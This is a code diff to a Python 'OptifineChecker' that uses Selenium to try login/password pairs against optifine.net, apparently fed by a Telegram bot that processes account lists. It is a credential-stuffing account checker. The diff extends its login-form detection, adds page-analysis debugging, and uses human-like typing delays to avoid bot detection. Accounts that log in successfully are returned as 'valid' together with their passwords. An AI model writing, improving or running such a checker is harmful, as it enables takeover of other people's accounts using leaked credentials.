@@ -111,6 +111,56 @@ class OptifineChecker:
         """Человекоподобная задержка"""
         time.sleep(random.uniform(min_sec, max_sec))
     
+    def analyze_page(self, login_prefix):
+        """Анализ структуры страницы для отладки"""
+        try:
+            # Сохраняем HTML
+            with open(f"/app/debug/page_source_{login_prefix}.html", 'w', encoding='utf-8') as f:
+                f.write(self.driver.page_source)
+            
+            # Сохраняем скриншот
+            self.driver.save_screenshot(f"/app/debug/page_{login_prefix}.png")
+            
+            # Анализируем страницу
+            logger.info(f"📌 Заголовок страницы: {self.driver.title}")
+            logger.info(f"📌 Текущий URL: {self.driver.current_url}")
+            
+            # Ищем все формы
+            forms = self.driver.find_elements(By.TAG_NAME, "form")
+            logger.info(f"📝 Найдено форм: {len(forms)}")
+            
+            for i, form in enumerate(forms):
+                logger.info(f"Форма {i}:")
+                try:
+                    action = form.get_attribute('action')
+                    method = form.get_attribute('method')
+                    logger.info(f"  action: {action}, method: {method}")
+                    
+                    # Ищем все input в форме
+                    inputs = form.find_elements(By.TAG_NAME, "input")
+                    for inp in inputs:
+                        input_type = inp.get_attribute('type')
+                        input_name = inp.get_attribute('name')
+                        input_id = inp.get_attribute('id')
+                        input_class = inp.get_attribute('class')
+                        input_placeholder = inp.get_attribute('placeholder')
+                        logger.info(f"  Input: type={input_type}, name={input_name}, id={input_id}, class={input_class}, placeholder={input_placeholder}")
+                    
+                    # Ищем кнопки
+                    buttons = form.find_elements(By.TAG_NAME, "button")
+                    for btn in buttons:
+                        btn_type = btn.get_attribute('type')
+                        btn_text = btn.text
+                        logger.info(f"  Button: type={btn_type}, text={btn_text}")
+                        
+                except Exception as e:
+                    logger.error(f"Ошибка при анализе формы: {e}")
+            
+            return True
+        except Exception as e:
+            logger.error(f"Ошибка при анализе страницы: {e}")
+            return False
+    
     async def check_account(self, login: str, password: str) -> Dict:
         """Проверка одного аккаунта через Selenium с полным входом"""
         
@@ -130,205 +180,283 @@ class OptifineChecker:
             # Переходим на страницу входа
             logger.info(f"🌐 Загружаю страницу входа...")
             self.driver.get("https://optifine.net/login")
-            self.human_like_delay(3, 5)
+            self.human_like_delay(5, 8)  # Увеличил задержку для загрузки
             
-            # Сохраняем скриншот
-            self.driver.save_screenshot(f"/app/debug/1_login_page_{login[:10]}.png")
+            # Анализируем страницу
+            self.analyze_page(login[:10])
             
-            # Ищем форму входа
+            # Ждем загрузки страницы
             try:
-                # Ждем загрузки страницы
-                WebDriverWait(self.driver, 10).until(
+                WebDriverWait(self.driver, 15).until(
                     EC.presence_of_element_located((By.TAG_NAME, "body"))
                 )
-                
-                # Ищем поле email/username
-                email_field = None
-                email_selectors = [
-                    "//input[@type='email']",
-                    "//input[@name='email']",
-                    "//input[@name='username']",
-                    "//input[@placeholder*='email']",
-                    "//input[@placeholder*='username']",
-                    "//input[@id='email']",
-                    "//input[@id='username']"
-                ]
-                
-                for selector in email_selectors:
-                    try:
-                        email_field = WebDriverWait(self.driver, 3).until(
-                            EC.presence_of_element_located((By.XPATH, selector))
-                        )
-                        if email_field.is_displayed():
-                            logger.info(f"✅ Найдено поле email: {selector}")
+            except:
+                logger.warning("⚠️ Таймаут при загрузке страницы")
+            
+            # Расширенный поиск поля email/username
+            email_field = None
+            email_selectors = [
+                # По именам
+                "//input[@name='email']",
+                "//input[@name='username']",
+                "//input[@name='login']",
+                "//input[@name='user']",
+                "//input[@name='log']",
+                # По ID
+                "//input[@id='email']",
+                "//input[@id='username']",
+                "//input[@id='login']",
+                "//input[@id='user']",
+                "//input[@id='user_login']",
+                # По типу
+                "//input[@type='email']",
+                "//input[@type='text']",
+                # По классам
+                "//input[contains(@class, 'email')]",
+                "//input[contains(@class, 'username')]",
+                "//input[contains(@class, 'login')]",
+                "//input[contains(@class, 'user')]",
+                "//input[contains(@class, 'input')]",
+                # По placeholder
+                "//input[@placeholder='Email']",
+                "//input[@placeholder='Username']",
+                "//input[@placeholder='Login']",
+                "//input[@placeholder='E-mail']",
+                "//input[@placeholder='email']",
+                "//input[@placeholder='username']",
+                # По атрибутам
+                "//input[@autocomplete='username']",
+                "//input[@autocomplete='email']",
+                # Любой input перед полем пароля
+                "//input[@type='password']/preceding::input[1]",
+            ]
+            
+            for selector in email_selectors:
+                try:
+                    elements = self.driver.find_elements(By.XPATH, selector)
+                    for element in elements:
+                        if element.is_displayed():
+                            email_field = element
+                            logger.info(f"✅ Найдено поле email по селектору: {selector}")
                             break
-                    except:
-                        continue
-                
-                if not email_field:
-                    logger.warning("❌ Поле email не найдено")
-                    return {
-                        'login': login,
-                        'status': 'invalid',
-                        'error': 'Поле email не найдено'
-                    }
-                
-                # Ищем поле пароля
-                password_field = None
-                password_selectors = [
-                    "//input[@type='password']",
-                    "//input[@name='password']",
-                    "//input[@placeholder*='password']",
-                    "//input[@id='password']"
-                ]
-                
-                for selector in password_selectors:
-                    try:
-                        password_field = WebDriverWait(self.driver, 3).until(
-                            EC.presence_of_element_located((By.XPATH, selector))
-                        )
-                        if password_field.is_displayed():
-                            logger.info(f"✅ Найдено поле пароля: {selector}")
+                    if email_field:
+                        break
+                except Exception as e:
+                    continue
+            
+            # Если все еще не нашли, ищем любой видимый input
+            if not email_field:
+                try:
+                    all_inputs = self.driver.find_elements(By.TAG_NAME, "input")
+                    for inp in all_inputs:
+                        input_type = inp.get_attribute('type')
+                        if input_type not in ['hidden', 'submit', 'button', 'password'] and inp.is_displayed():
+                            email_field = inp
+                            logger.info(f"✅ Найден первый подходящий input: type={input_type}")
                             break
-                    except:
-                        continue
-                
-                if not password_field:
-                    logger.warning("❌ Поле пароля не найдено")
-                    return {
-                        'login': login,
-                        'status': 'invalid',
-                        'error': 'Поле пароля не найдено'
-                    }
-                
-                # Ищем кнопку входа
-                submit_button = None
-                submit_selectors = [
-                    "//button[@type='submit']",
-                    "//input[@type='submit']",
-                    "//button[contains(text(), 'Login')]",
-                    "//button[contains(text(), 'Sign in')]",
-                    "//button[contains(text(), 'Log in')]",
-                    "//button[contains(text(), 'Войти')]"
-                ]
-                
-                for selector in submit_selectors:
-                    try:
-                        submit_button = WebDriverWait(self.driver, 3).until(
-                            EC.element_to_be_clickable((By.XPATH, selector))
-                        )
-                        if submit_button.is_displayed():
-                            logger.info(f"✅ Найдена кнопка: {selector}")
-                            break
-                    except:
-                        continue
-                
-                if not submit_button:
-                    logger.warning("❌ Кнопка не найдена")
-                    return {
-                        'login': login,
-                        'status': 'invalid',
-                        'error': 'Кнопка не найдена'
-                    }
-                
-                # Вводим email
-                logger.info(f"✍️ Ввожу email: {login[:20]}...")
-                email_field.clear()
-                for char in login:
-                    email_field.send_keys(char)
-                    time.sleep(random.uniform(0.03, 0.08))
-                
-                self.human_like_delay(0.5, 1)
-                
-                # Вводим пароль
-                logger.info(f"✍️ Ввожу пароль...")
-                password_field.clear()
-                for char in password:
-                    password_field.send_keys(char)
-                    time.sleep(random.uniform(0.03, 0.08))
-                
-                self.human_like_delay(0.5, 1)
-                
-                # Сохраняем скриншот перед отправкой
-                self.driver.save_screenshot(f"/app/debug/2_before_submit_{login[:10]}.png")
-                
-                # Нажимаем кнопку
-                logger.info("🖱️ Нажимаю кнопку входа")
-                submit_button.click()
-                
-                # Ждем результат
-                self.human_like_delay(5, 8)
-                
-                # Сохраняем результат
-                self.driver.save_screenshot(f"/app/debug/3_after_submit_{login[:10]}.png")
-                
-                # Анализируем результат
-                current_url = self.driver.current_url
-                page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
-                
-                logger.info(f"📌 URL после входа: {current_url}")
-                
-                # Критерии успеха
-                success_indicators = [
-                    'dashboard', 'profile', 'account', 'welcome', 
-                    'logout', 'log out', 'my account', 'downloads'
-                ]
-                
-                # Критерии ошибки
-                error_indicators = [
-                    'invalid', 'incorrect', 'wrong', 'error', 
-                    'failed', 'not found', 'try again'
-                ]
-                
-                # Проверяем успешность
-                if any(indicator in current_url.lower() for indicator in ['dashboard', 'profile', 'account']):
-                    logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
-                    return {
-                        'login': login,
-                        'password': password,
-                        'status': 'valid',
-                        'method': 'login_success'
-                    }
-                
-                if any(indicator in page_text for indicator in success_indicators):
-                    logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
-                    return {
-                        'login': login,
-                        'password': password,
-                        'status': 'valid',
-                        'method': 'login_success'
-                    }
-                
-                if any(indicator in page_text for indicator in error_indicators):
-                    logger.info(f"❌ Неверный: {login[:20]}")
-                    return {
-                        'login': login,
-                        'status': 'invalid',
-                        'error': 'Неверный логин/пароль'
-                    }
-                
-                # Если неопределенный результат
-                logger.info(f"⚠️ Неопределенный результат для {login[:20]}")
-                return {
-                    'login': login,
-                    'status': 'invalid',
-                    'error': 'Неопределенный результат'
-                }
-                
-            except Exception as e:
-                logger.error(f"❌ Ошибка при входе: {e}")
+                except:
+                    pass
+            
+            if not email_field:
+                logger.warning("❌ Поле email не найдено")
                 return {
                     'login': login,
                     'status': 'error',
-                    'error': str(e)[:50]
+                    'error': 'Поле email не найдено'
                 }
+            
+            # Поиск поля пароля
+            password_field = None
+            password_selectors = [
+                "//input[@type='password']",
+                "//input[@name='password']",
+                "//input[@name='pwd']",
+                "//input[@name='pass']",
+                "//input[@id='password']",
+                "//input[@id='pass']",
+                "//input[contains(@class, 'password')]",
+                "//input[contains(@class, 'pass')]",
+                "//input[@placeholder='Password']",
+                "//input[@placeholder='password']",
+                "//input[@autocomplete='current-password']",
+            ]
+            
+            for selector in password_selectors:
+                try:
+                    elements = self.driver.find_elements(By.XPATH, selector)
+                    for element in elements:
+                        if element.is_displayed():
+                            password_field = element
+                            logger.info(f"✅ Найдено поле пароля по селектору: {selector}")
+                            break
+                    if password_field:
+                        break
+                except:
+                    continue
+            
+            if not password_field:
+                logger.warning("❌ Поле пароля не найдено")
+                return {
+                    'login': login,
+                    'status': 'error',
+                    'error': 'Поле пароля не найдено'
+                }
+            
+            # Поиск кнопки входа
+            submit_button = None
+            submit_selectors = [
+                "//button[@type='submit']",
+                "//input[@type='submit']",
+                "//button[contains(text(), 'Login')]",
+                "//button[contains(text(), 'Sign in')]",
+                "//button[contains(text(), 'Log in')]",
+                "//button[contains(text(), 'Войти')]",
+                "//input[@value='Login']",
+                "//input[@value='Sign in']",
+                "//input[@value='Log in']",
+                "//button[contains(@class, 'login')]",
+                "//button[contains(@class, 'submit')]",
+                "//input[contains(@class, 'login')]",
+                "//input[contains(@class, 'submit')]",
+                "//*[@type='submit']",
+            ]
+            
+            for selector in submit_selectors:
+                try:
+                    elements = self.driver.find_elements(By.XPATH, selector)
+                    for element in elements:
+                        if element.is_displayed() and element.is_enabled():
+                            submit_button = element
+                            logger.info(f"✅ Найдена кнопка по селектору: {selector}")
+                            break
+                    if submit_button:
+                        break
+                except:
+                    continue
+            
+            if not submit_button:
+                logger.warning("❌ Кнопка не найдена")
+                return {
+                    'login': login,
+                    'status': 'error',
+                    'error': 'Кнопка не найдена'
+                }
+            
+            # Вводим email
+            logger.info(f"✍️ Ввожу email: {login[:20]}...")
+            email_field.clear()
+            for char in login:
+                email_field.send_keys(char)
+                time.sleep(random.uniform(0.03, 0.08))
+            
+            self.human_like_delay(0.5, 1)
+            
+            # Вводим пароль
+            logger.info(f"✍️ Ввожу пароль...")
+            password_field.clear()
+            for char in password:
+                password_field.send_keys(char)
+                time.sleep(random.uniform(0.03, 0.08))
+            
+            self.human_like_delay(0.5, 1)
+            
+            # Сохраняем скриншот перед отправкой
+            self.driver.save_screenshot(f"/app/debug/before_submit_{login[:10]}.png")
+            
+            # Нажимаем кнопку
+            logger.info("🖱️ Нажимаю кнопку входа")
+            try:
+                # Пробуем обычный клик
+                submit_button.click()
+            except:
+                try:
+                    # Пробуем клик через JavaScript
+                    self.driver.execute_script("arguments[0].click();", submit_button)
+                except Exception as e:
+                    logger.error(f"❌ Не удалось нажать кнопку: {e}")
+                    return {
+                        'login': login,
+                        'status': 'error',
+                        'error': 'Не удалось нажать кнопку'
+                    }
+            
+            # Ждем результат
+            self.human_like_delay(8, 12)  # Увеличил задержку для обработки
+            
+            # Сохраняем результат
+            self.driver.save_screenshot(f"/app/debug/after_submit_{login[:10]}.png")
+            
+            # Анализируем результат
+            current_url = self.driver.current_url
+            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
+            
+            logger.info(f"📌 URL после входа: {current_url}")
+            
+            # Критерии успеха
+            success_indicators = [
+                'dashboard', 'profile', 'account', 'welcome', 
+                'logout', 'log out', 'my account', 'downloads',
+                'my profile', 'settings', 'preferences'
+            ]
+            
+            # Критерии ошибки
+            error_indicators = [
+                'invalid', 'incorrect', 'wrong', 'error', 
+                'failed', 'not found', 'try again', 'does not exist',
+                'doesn\'t exist', 'not registered', 'no account'
+            ]
+            
+            # Проверяем успешность
+            if any(indicator in current_url.lower() for indicator in ['dashboard', 'profile', 'account', 'home']):
+                logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
+                return {
+                    'login': login,
+                    'password': password,
+                    'status': 'valid',
+                    'method': 'login_success'
+                }
+            
+            if any(indicator in page_text for indicator in success_indicators):
+                logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
+                return {
+                    'login': login,
+                    'password': password,
+                    'status': 'valid',
+                    'method': 'login_success'
+                }
+            
+            if any(indicator in page_text for indicator in error_indicators):
+                logger.info(f"❌ Неверный: {login[:20]}")
+                return {
+                    'login': login,
+                    'status': 'invalid',
+                    'error': 'Неверный логин/пароль'
+                }
+            
+            # Проверяем, остались ли мы на странице входа
+            if 'login' in current_url.lower():
+                logger.info(f"❌ Остались на странице входа: {login[:20]}")
+                return {
+                    'login': login,
+                    'status': 'invalid',
+                    'error': 'Остались на странице входа'
+                }
+            
+            # Если неопределенный результат
+            logger.info(f"⚠️ Неопределенный результат для {login[:20]}")
+            return {
+                'login': login,
+                'status': 'invalid',
+                'error': 'Неопределенный результат'
+            }
             
         except Exception as e:
             logger.error(f"❌ Ошибка при проверке {login[:20]}: {e}")
+            logger.exception("Детали ошибки:")
             return {
                 'login': login,
                 'status': 'error',
-                'error': str(e)[:50]
+                'error': str(e)[:100]
             }
     
     def close(self):
@@ -427,7 +555,7 @@ async def process_file(file_path, update, context):
             bot_stats['total'] += 1
             
             # Задержка между запросами
-            await asyncio.sleep(2)
+            await asyncio.sleep(3)
         
         # Сохраняем результаты
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
